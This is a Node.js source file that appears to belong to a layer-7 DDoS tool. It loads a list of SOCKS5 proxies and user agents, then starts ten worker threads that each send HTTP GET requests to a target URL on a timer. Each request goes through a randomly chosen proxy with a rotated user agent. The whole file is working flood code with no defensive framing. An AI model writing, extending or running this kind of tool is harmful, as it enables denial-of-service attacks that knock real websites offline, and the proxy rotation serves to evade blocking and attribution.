const http = require('http');
const https = require('https');
const fs = require('fs');
const { SocksClient } = require('socks');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const layer7 = require('./methods/layer7');

const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);

async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
    return new Promise((resolve, reject) => {
        const [proxyIp, proxyPort] = proxy.split(':');
        const target = new URL(targetUrl);

        const options = {
            proxy: {
                ipaddress: proxyIp,
                port: parseInt(proxyPort),
                type: 5, 
            },
            destination: {
                host: target.hostname,
                port: target.port || (target.protocol === 'https:' ? 443 : 80),
            },
            command: 'connect',
            timeout: 5000,
        };

        SocksClient.createConnection(options, (err, info) => {
            if (err) {
                console.error(`LDS: Failed to connect to ${targetUrl} via ${proxy}`);
                reject(err);
                return;
            }

            if (layer7[method]) {
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                const protocol = target.protocol === 'https:' ? https : http;

                const req = protocol.request({
                    host: target.hostname,
                    port: target.port || (target.protocol === 'https:' ? 443 : 80),
                    path: target.pathname,
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgent,
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                    },
                    socket: info.socket,
                }, (res) => {
                    console.log(`LDS: Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
                    resolve();
                });

                req.on('error', (err) => {
                    if (err.code === 'ECONNRESET') {
                        console.error(`LDS: Connection reset by ${proxy}`);
                    } else {
                        console.error(`LDS: Error with ${proxy}`);
                    }
                    reject(err);
                });

                req.end();
            } else {
                console.error(`LDS: Method ${method} not found.`);
                reject(new Error(`LDS: Method ${method} not found.`));
            }
        });
    });
}

function startWorker(targetUrl, delay, kbSize, method) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(__filename, {
            workerData: { targetUrl, delay, kbSize, method },
        });

        worker.on('message', resolve);
        worker.on('error', reject);
        worker.on('exit', (code) => {
            if (code !== 0) reject(new Error(`Worker stopped with exit code ${code}`));
        });
    });
}

if (!isMainThread) {
    const { targetUrl, delay, kbSize, method } = workerData;
    setInterval(() => {
        const proxy = socks5Proxies[Math.floor(Math.random() * socks5Proxies.length)];
        sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
            console.error(`LDS: Error with ${proxy}`);
        });
    }, delay);
}

function start(targetUrl, delay, kbSize, method) {
    const numWorkers = 10; 
    for (let i = 0; i < numWorkers; i++) {
        startWorker(targetUrl, delay, kbSize, method).catch((err) => {
            console.error(`LDS: Worker error: ${err.message}`);
        });
    }
}

module.exports = { start };
